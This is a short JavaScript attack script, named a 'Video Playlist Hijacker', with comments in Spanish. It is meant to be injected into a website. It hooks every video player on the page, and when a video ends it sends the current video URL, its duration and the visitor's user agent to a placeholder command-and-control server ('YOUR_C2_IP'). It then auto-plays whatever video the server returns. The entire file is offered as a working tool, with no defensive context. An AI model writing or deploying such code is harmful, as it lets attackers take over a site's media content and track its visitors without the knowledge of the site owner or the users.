/**
 * Shadow CMS/CDN - Video Playlist Hijacker
 * Intercepta fin de video → Fetch next desde C2 → Auto-play
 */
(function() {
    'use strict';
    
    // Backup originals
    const _onended = HTMLMediaElement.prototype.onended;
    const _load = HTMLMediaElement.prototype.load;
    
    // Hook todos los video elements
    function hookVideos() {
        document.querySelectorAll('video, .video-player, [data-video]').forEach(video => {
            if (!video.hasShadowCMS) {
                video.hasShadowCMS = true;
                video.onended = shadowNextVideo;
                console.log('[+] 🎬 Video hooked:', video.src || video.currentSrc);
            }
        });
    }
    
    // Next video desde C2
    async function shadowNextVideo() {
        try {
            const resp = await fetch('http://YOUR_C2_IP:8080/api/next-video', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    current: this.currentSrc,
                    duration: this.duration,
                    device: navigator.userAgent.slice(0,50)
                })
            });
            const {video_url, title} = await resp.json();
            
            // Load + play next
            this.src = video_url;
            this.load();
            this.play();
            console.log(`[+] ⏭️ Next: ${title} → ${video_url}`);
            
        } catch(e) {
            console.error('[!] ShadowCMS error:', e);
            _onended?.call(this);
        }
    }
    
    // Auto-hook en DOM changes
    const observer = new MutationObserver(hookVideos);
    observer.observe(document.body, {childList: true, subtree: true});
    hookVideos(); // Initial scan
    
    console.log('[+] 🕷️ ShadowCMS loaded');
})();